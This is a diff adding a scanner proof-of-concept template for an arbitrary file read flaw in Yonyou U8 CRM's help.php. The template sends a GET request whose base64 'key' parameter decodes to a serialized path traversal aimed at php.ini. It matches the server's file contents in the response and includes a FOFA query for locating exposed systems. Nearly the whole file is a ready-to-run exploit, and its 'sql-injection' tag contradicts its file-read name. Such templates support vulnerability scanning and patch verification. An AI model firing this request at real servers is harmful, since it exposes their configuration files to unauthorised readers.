@@ -1,0 +1,16 @@
+id: poc-yaml-yongyou-u8-crm-help-php-anyfile-read
+info:
+  name: 用友U8 CRM客户关系管理系统 help.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+requests:
+- method: GET
+  path: /pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9
+  expression: status_code == 200 && contains(body,"allow_url_fopen") && contains(body,"SQL
+    SERVER  Error") && contains(body,"allow_url_include") && contains(body,"About
+    php.ini")
+variables: {}
+transport: http
